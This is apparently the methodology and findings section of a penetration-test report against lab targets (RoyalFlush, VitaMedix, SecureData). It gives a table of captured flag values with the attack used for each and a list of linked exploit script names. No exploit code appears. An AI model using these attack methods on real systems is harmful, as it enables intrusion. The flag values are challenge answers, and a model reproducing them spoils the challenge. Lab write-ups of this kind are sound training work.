The assessment followed a structured web application penetration testing methodology aligned with industry standards, including the OWASP Testing Guide and OWASP Web Security Testing Guide (WSTG). Testing was performed both manually and with the aid of automated tools, with all findings manually verified and exploited to confirm impact.

The methodology included the following phases:

1. **Information Gathering and Reconnaissance**
   - Enumerated in-scope subdomains, routes, and exposed services.
   - Reviewed public and authenticated content for information disclosure.
   - Identified technology stack, server versions, and third-party components.

2. **Authentication and Session Management Testing**
   - Tested for weak credentials, credential leakage, brute-force resistance, and session fixation.
   - Evaluated cookie security attributes (HttpOnly, Secure, SameSite) and token integrity.
   - Assessed password reset, registration, and email verification flows.

3. **Authorization and Access Control Testing**
   - Evaluated horizontal and vertical privilege escalation paths.
   - Tested for IDOR/BOLA, role manipulation, and unauthorized endpoint access.

4. **Input Validation and Injection Testing**
   - Tested for SQL injection, NoSQL injection, LDAP injection, XPath injection, OS command injection, CRLF injection, and unsafe deserialization.
   - Assessed server-side request forgery (SSRF), XML external entity (XXE) where applicable, and unsafe evaluation functions.

5. **Client-Side and Browser Security Testing**
   - Tested for cross-site scripting (XSS), cross-site request forgery (CSRF), cache poisoning, and DNS rebinding.
   - Reviewed Content Security Policy and other security headers.

6. **Server and Infrastructure Testing**
   - Assessed HTTP request smuggling, reverse-proxy misconfigurations, and cache behavior.
   - Reviewed internal service exposure and network segmentation.

7. **Business Logic and Race Condition Testing**
   - Evaluated multi-step workflows for logic flaws and state manipulation.
   - Tested for race conditions on sensitive operations.

8. **Exploitation and Impact Validation**
   - Confirmed exploitability of each finding and documented proof-of-concept steps.
   - Demonstrated impact up to and including remote code execution, data exfiltration, and authentication bypass.


### Flags Discovered {#flags-discovered}

The following flags were captured during the assessment:

| Flag # | Application | Flag Value | Method Used |
| ------ | ----------- | ---------- | ----------- |
| 1. RoyalFlush Dashboard | **RoyalFlush - Auth** | **456113d7a6b2c73cb8de7f3fbde95580** | **JWT Forgery** |
| 2. RoyalFlush RCE | **RoyalFlush - RCE** | **ddf1df82dea9ce0d6ab3a03aa80cbdac** | **Command Injection** |
| 3. VitaMedix Dashboard | **VitaMedix - Auth** | **39d18b5b75ce0bbba31b19630812e1b7** | **Race Condition** |
| 4. SecureData RCE | **SecureData - RCE** | **85cef6bf6a0a68f45c8d6eb37f2cb79c** | **XSS → RCE** |
| 5. VitaMedix Dashboard | **VitaMedix - Auth** | **d26a4b37437173ac7c4dc2c708b6323f** | **CRLF Email Header Injection** |
| 6. SecureData RCE | **SecureData - RCE** | **7c6ada9cb7aa60c7740bcb1dde7496bf** | **Command Injection** |


### Exploits {#exploits}

#### Royal Flush
[www.royalflush.htb-forgot-SQLI.py](exploits/www.royalflush.htb-forgot-SQLI.py)

[www.royalflush.htb-JWT-Forgery.py](exploits/www.royalflush.htb-JWT-Forgery.py)

[vault.royalflush.htb-SecondaryEmail-SQLI-Web-Config-dump.py](exploits/vault.royalflush.htb-SecondaryEmail-SQLI-Web-Config-dump.py)

[vault.royalflush.htb-Deserialization-Payload.py](exploits/vault.royalflush.htb-Deserialization-Payload.py)

---
#### Vitamedix

[ldap.vitamedix.htb-usernames.py](exploits/ldap.vitamedix.htb-usernames.py)

[storage.vitamedix.htb-SMTP-Creds-LEAK.py](exploits/storage.vitamedix.htb-SMTP-Creds-LEAK.py)


[www.vitamedix.htb-validate-token-NOSQLI.py](exploits/www.vitamedix.htb-validate-token-NOSQLI.py)

[www.vitamedix.htb-XSS-redirect.php](exploits/www.vitamedix.htb-XSS-redirect.php)

---
#### SecureData

[api-securedata-RCE.py](exploits/api-securedata-RCE.py)




